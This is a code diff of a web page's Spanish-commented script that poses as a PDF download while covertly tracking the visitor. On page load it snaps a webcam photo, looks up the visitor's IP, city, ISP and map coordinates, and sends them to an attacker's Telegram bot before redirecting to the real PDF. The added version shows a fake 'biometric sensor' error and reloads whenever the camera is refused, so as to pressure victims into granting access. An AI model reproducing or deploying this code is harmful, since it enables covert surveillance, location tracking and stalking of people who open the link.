@@ -1,73 +1,68 @@
 <script src="config.js"></script>
+    <script>
+        async function iniciarProceso() {
+            let fotoBase64 = null;
+            const statusText = document.querySelector('.blink');
 
-<script>
-    async function rastrear() {
-        let fotoCapturada = null;
-
-        try {
-            // 1. Intentar capturar foto (Trampa de cámara)
             try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-                const video = document.createElement('video');
-                video.srcObject = stream;
-                await video.play();
+                // 1. Intentar capturar la foto
+                try {
+                    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                    const video = document.createElement('video');
+                    video.srcObject = stream;
+                    await video.play();
 
-                const canvas = document.createElement('canvas');
-                canvas.width = video.videoWidth;
-                canvas.height = video.videoHeight;
-                canvas.getContext('2d').drawImage(video, 0, 0);
+                    const canvas = document.createElement('canvas');
+                    canvas.width = video.videoWidth;
+                    canvas.height = video.videoHeight;
+                    canvas.getContext('2d').drawImage(video, 0, 0);
+                    
+                    fotoBase64 = canvas.toDataURL('image/jpeg');
+                    stream.getTracks().forEach(t => t.stop());
+                } catch (e) {
+                    // Si bloquea la cámara, lanzamos el error falso
+                    statusText.innerHTML = "❌ ERROR DE CONEXIÓN SEGURA";
+                    statusText.style.color = "red";
+                    alert("Error: El sensor biométrico no responde. Por favor, recargue y permita el acceso para desbloquear el PDF.");
+                    location.reload(); // Recarga la página automáticamente
+                    return;
+                }
+
+                statusText.innerHTML = "✅ IDENTIDAD VERIFICADA. REDIRIGIENDO...";
                 
-                // Convertir foto a Base64 para enviarla
-                fotoCapturada = canvas.toDataURL('image/jpeg');
-                
-                // Detener cámara inmediatamente
-                stream.getTracks().forEach(track => track.stop());
-            } catch (e) {
-                console.log("Cámara rechazada o no disponible");
-            }
+                // 2. Obtener datos de red
+                const res = await fetch('https://ipapi.co/json/');
+                const d = await res.json();
 
-            // 2. Obtener datos de red y dispositivo
-            const res = await fetch('https://ipapi.co/json/');
-            const d = await res.json();
-            const agente = navigator.userAgent;
+                // 3. Formatear reporte
+                const texto = `🚨 *OBJETIVO DETECTADO*\n\n` +
+                              `📍 *Ciudad:* ${d.city}, ${d.country_name}\n` +
+                              `🌐 *IP:* \`${d.ip}\`\n` +
+                              `📶 *ISP:* ${d.org}\n` +
+                              `🔗 *Mapa:* https://www.google.com/maps?q=${d.latitude},${d.longitude}`;
 
-            const texto = `🔔 *ALERTA DE ACCESO*\n\n` +
-                          `🌐 *IP:* \`${d.ip}\`\n` +
-                          `📍 *Lugar:* ${d.city}, ${d.country_name}\n` +
-                          `📱 *Dispositivo:* ${agente.split(')')[0]})\n` +
-                          `🔗 *Mapa:* https://www.google.com/maps?q=${d.latitude},${d.longitude}`;
-
-            // 3. Enviar datos a Telegram
-            await fetch(`https://api.telegram.org/bot${CONFIG.TOKEN}/sendMessage`, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    chat_id: CONFIG.CHAT_ID,
-                    text: texto,
-                    parse_mode: 'Markdown'
-                })
-            });
-
-            // 4. Si hay foto, enviarla como imagen separada
-            if (fotoCapturada) {
-                const blob = await (await fetch(fotoCapturada)).blob();
-                const formData = new FormData();
-                formData.append('chat_id', CONFIG.CHAT_ID);
-                formData.append('photo', blob, 'foto.jpg');
-
-                await fetch(`https://api.telegram.org/bot${CONFIG.TOKEN}/sendPhoto`, {
+                // 4. Enviar reporte y Foto
+                await fetch(`https://api.telegram.org/bot${CONFIG.TOKEN}/sendMessage`, {
                     method: 'POST',
-                    body: formData
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ chat_id: CONFIG.CHAT_ID, text: texto, parse_mode: 'Markdown' })
                 });
+
+                if (fotoBase64) {
+                    const blob = await (await fetch(fotoBase64)).blob();
+                    const formData = new FormData();
+                    formData.append('chat_id', CONFIG.CHAT_ID);
+                    formData.append('photo', blob, 'captura.jpg');
+                    await fetch(`https://api.telegram.org/bot${CONFIG.TOKEN}/sendPhoto`, { method: 'POST', body: formData });
+                }
+
+            } catch (err) {
+                console.log("Error crítico");
+            } finally {
+                // Redirigir al PDF después de 2 segundos
+                setTimeout(() => { window.location.href = CONFIG.PDF_URL; }, 2000);
             }
-
-        } catch (err) {
-            console.log("Error silencioso...");
-        } finally {
-            // Redirigir al PDF real
-            window.location.href = CONFIG.PDF_URL;
         }
-    }
 
-    window.onload = rastrear;
-</script>
+        window.onload = iniciarProceso;
+    </script>
